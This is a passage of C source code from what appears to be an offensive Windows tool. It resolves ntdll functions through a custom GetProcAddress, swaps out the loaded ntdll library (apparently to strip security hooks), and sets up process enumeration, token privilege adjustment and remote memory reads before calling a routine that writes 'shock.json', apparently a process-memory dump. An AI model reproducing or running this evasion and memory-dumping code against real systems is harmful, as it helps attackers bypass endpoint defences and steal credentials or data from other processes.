            if (strcmp(functionName, func_name) == 0) {
                WORD ordinal = 0;
                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal), &aux);
                // printf("[+] Ordinal: %d\n", ordinal);
                void* functionAddress;
                NtReadVirtualMemory(hProcess, (BYTE*)addressOfFunctionsRA + ordinal * 4, &functionAddress, sizeof(functionAddress), &aux);
                // printf("[+] functionAddress: \t\t\t\t0x%p\n", functionAddress);
                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress & 0xFFFFFFFF;
                return (BYTE*)pDosHdr + (DWORD_PTR)maskedFunctionAddress;
            }
            addressOfNamesRA = (BYTE*)addressOfNamesRA + 4;
            addressOfNameOrdinalsRA = (BYTE*)addressOfNameOrdinalsRA + 2;
        }
    }
    return NULL;
}


void initializeFunctions() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress((HMODULE)hNtdll, "NtReadVirtualMemory");

    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, "NtClose");
    NtOpenProcessToken = (NtOpenProcessTokenFn)CustomGetProcAddress(hNtdll, "NtOpenProcessToken");
    NtAdjustPrivilegesToken = (NtAdjustPrivilegesTokenFn)CustomGetProcAddress(hNtdll, "NtAdjustPrivilegesToken");
    NtGetNextProcess = (NtGetNextProcessFn)CustomGetProcAddress(hNtdll, "NtGetNextProcess");
    NtQueryVirtualMemory = (NtQueryVirtualMemory_t)CustomGetProcAddress(hNtdll, "NtQueryVirtualMemory");
    NtOpenSection = (NtOpenSectionFn)CustomGetProcAddress(hNtdll, "NtOpenSection");
}


int main(int argc, char* argv[]) {
    initializeFunctions();

    // Replace ntdll library
    const char* ntdll_option = "default";
    if (argc >= 2)
    {
        ntdll_option = argv[1];
    }
    ReplaceLibrary(ntdll_option);

    const char* filename = "shock.json";
    Shock(filename);
    return 0;
}

